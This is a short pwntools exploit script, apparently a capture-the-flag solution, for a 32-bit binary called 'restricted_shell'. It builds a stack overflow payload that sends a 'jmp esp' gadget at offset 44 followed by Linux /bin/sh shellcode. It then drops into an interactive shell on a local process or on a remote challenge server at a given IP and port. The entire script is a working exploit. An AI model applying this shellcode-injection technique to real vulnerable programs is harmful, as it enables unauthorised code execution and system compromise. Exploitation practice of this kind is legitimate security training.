#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template restricted_shell
from pwn import *

exe = context.binary = ELF('restricted_shell')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("149.202.200.158", 6003, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak shell
continue
'''.format(**locals())

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

jmp_esp = 0x08048593 #jmp esp;

io = start()

payload = dict()

payload[0] = b"ls"
payload[44] = jmp_esp
payload[48] = asm(shellcraft.i386.linux.sh())

payload = fit(payload)

io.sendline(payload)

io.interactive()

